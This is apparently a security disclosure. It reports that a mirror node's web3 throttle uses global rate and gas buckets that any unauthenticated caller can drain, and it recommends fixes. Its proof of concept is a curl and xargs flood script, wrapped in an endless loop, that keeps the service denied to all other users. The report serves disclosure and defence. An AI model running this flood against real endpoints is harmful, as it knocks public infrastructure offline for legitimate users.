### Title
Global Shared Rate/Gas Bucket Exhaustion via Unauthenticated Repeated Requests (DoS)

### Summary
`ThrottleManagerImpl.throttle()` enforces rate and gas limits using two globally shared `Bucket` instances with no per-IP, per-user, or per-request-identity partitioning. An unprivileged attacker can flood the endpoint with identical (or varied) `ContractCallRequest`s, consuming all tokens from both the `rateLimitBucket` and `gasLimitBucket` within a single refill window, creating a complete denial-of-service window for all other users. No deduplication, no source-identity check, and no per-caller sub-bucket exist anywhere in the throttle path.

### Finding Description

**Exact code path:**

`ThrottleManagerImpl.throttle()` (lines 37–49):

```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Both buckets are singleton Spring beans defined in `ThrottleConfiguration`:

- `rateLimitBucket`: capacity = `requestsPerSecond` (default **500**), refills every 1 second.
- `gasLimitBucket`: capacity = `scaleGas(gasPerSecond)` = `7_500_000_000 / 10_000` = **750,000 tokens**, refills every 1 second.

**Root cause — failed assumptions:**

1. The design assumes the global rate limit is sufficient to prevent any single caller from monopolizing the shared resource. This assumption fails because there is no per-caller sub-limit.
2. The design assumes `restore(gas)` (line 59–64) will return gas tokens after execution, partially mitigating gas exhaustion. This is true for gas, but the `rateLimitBucket` is **never restored** — each request permanently consumes 1 rate token for the current window regardless of outcome.
3. No request deduplication (no content hash, no idempotency key, no IP tracking) means identical requests are indistinguishable from distinct ones.

**Exploit flow:**

- Attacker sends 500 concurrent HTTP POST requests to `/api/v1/contracts/call` (or equivalent), each with `gas = 15_000_000` (the default, minimum `@Min(21_000)` is the floor but default is 15M).
- Each request: consumes 1 rate token + `scaleGas(15_000_000)` = 1,500 gas tokens.
- After 500 requests: `rateLimitBucket` is fully drained (0 tokens). All subsequent requests from **any** user receive HTTP 429 for the remainder of the 1-second window.
- Simultaneously, 500 × 1,500 = 750,000 gas tokens are consumed, fully draining `gasLimitBucket` as well.
- The attacker repeats this every second to maintain the DoS indefinitely.

**Why existing checks fail:**

- `rateLimitBucket` is a single global `Bucket` — no per-IP partitioning.
- `gasLimitBucket` is also global; `restore()` only partially helps because it is called asynchronously after execution, not before the bucket is drained.
- The `request` filter chain (lines 44–48) can apply `REJECT`/`THROTTLE` actions, but these are opt-in operator configurations on request content patterns — they are not enabled by default and do not enforce per-caller limits.
- No Spring Security filter, servlet filter, or reverse-proxy rule is present in this code path to enforce per-IP limits before `throttle()` is called.

### Impact Explanation

Any unprivileged external user can render the entire web3 JSON-RPC endpoint unavailable for all other users for sustained periods. Because the refill window is 1 second and the attacker can re-exhaust both buckets each second with a trivial HTTP flood, the effective availability of the service drops to zero for legitimate callers. This is a complete denial-of-service against a public-facing infrastructure component with no authentication requirement.

### Likelihood Explanation

The attack requires no credentials, no special knowledge, and no on-chain assets. Any HTTP client capable of sending ~500 concurrent requests per second (trivially achievable with `curl`, `wrk`, `ab`, or a small script) can execute this. The attack is repeatable indefinitely, is stateless on the attacker's side, and leaves no persistent trace beyond server logs. Likelihood is **high**.

### Recommendation

1. **Add per-IP rate limiting** as a first-class concern, either via a servlet filter before `ThrottleManagerImpl` is invoked, or by partitioning the `Bucket` by caller IP using Bucket4j's `ProxyManager` with a `ConcurrentHashMap` or distributed cache backend.
2. **Restore rate tokens on rejection**: When `gasLimitBucket.tryConsume()` fails after `rateLimitBucket.tryConsume(1)` has already succeeded (line 38 vs 40), the consumed rate token is not returned. Add a compensating `rateLimitBucket.addTokens(1)` in the `else if` branch.
3. **Enforce a per-request gas cap** at the HTTP layer (reject requests with `gas` above a configurable maximum before they reach `throttle()`).
4. **Deploy a reverse proxy** (e.g., nginx, Envoy) with per-IP connection and request-rate limits as a defense-in-depth layer outside the application.

### Proof of Concept

```bash
# Exhaust both buckets in one second using 500 parallel requests
# Default gas = 15_000_000 (set in ContractCallRequest), scaled to 1500 tokens each
# 500 requests × 1500 gas tokens = 750,000 = full gasLimitBucket capacity
# 500 requests × 1 rate token  = 500     = full rateLimitBucket capacity

seq 1 500 | xargs -P 500 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://<mirror-node-host>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000,"data":"0x"}'

# Expected: first ~500 return 200, subsequent requests from any user return 429
# Repeat every second to maintain DoS:
while true; do
  seq 1 500 | xargs -P 500 -I{} curl -s -o /dev/null \
    -X POST http://<mirror-node-host>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":15000000,"data":"0x"}'
done
```

```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }

    @Bean(name = GAS_LIMIT_BUCKET)
    Bucket gasLimitBucket() {
        long gasLimit = throttleProperties.getGasPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(gasLimit)
                .refillGreedy(gasLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder()
                .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
                .addLimit(limit)
                .build();
```

```java
    @NotNull
    private List<RequestProperties> request = List.of();

    @Min(1)
    private long requestsPerSecond = 500;

    // Necessary since bucket4j has a max capacity and fill rate of 1 token per nanosecond
    public long getGasPerSecond() {
        return scaleGas(gasPerSecond);
    }

    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```
